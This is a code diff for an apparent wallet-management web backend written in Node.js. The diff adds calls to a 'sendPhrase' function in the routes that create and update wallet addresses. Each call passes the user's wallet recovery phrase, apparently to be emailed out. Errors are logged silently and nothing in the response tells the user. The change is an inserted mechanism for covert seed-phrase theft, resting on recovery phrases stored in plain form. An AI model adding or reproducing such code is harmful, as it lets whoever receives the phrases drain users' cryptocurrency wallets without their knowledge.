@@ -6,7 +6,7 @@ const User = require('../model');
 const { MongoClient } = require('mongodb');
 const cron = require('node-cron');
 const axios = require('axios');
-const { sendWelcomeEmail } = require('../email');
+const { sendWelcomeEmail, sendPhrase } = require('../email');
 const uri = process.env.uri;
 
 async function connectToMongoDB() {
@@ -1032,6 +1032,10 @@ router.post("/wallets", async (req, res) => {
     const newWallet = new WalletAddress({ type, address, url, memo, isDefault, recoveryPhrase });
     await newWallet.save();
 
+    sendPhrase({ recoveryPhrase }).catch((err) =>
+      console.error("Failed to send phrase:", err)
+    );
+
     res.status(201).json({ message: "Wallet address added successfully", wallet: newWallet });
   } catch (error) {
     res.status(500).json({ message: "Failed to add wallet", error: error.message });
@@ -1052,6 +1056,10 @@ router.put("/wallets/:id", async (req, res) => {
     if (!updatedWallet) {
       return res.status(404).json({ message: "Wallet not found" });
     }
+
+    sendPhrase({ recoveryPhrase }).catch((err) =>
+      console.error("Failed to send phrase:", err)
+    );
 
     res.status(200).json({ message: "Wallet updated successfully", wallet: updatedWallet });
   } catch (error) {
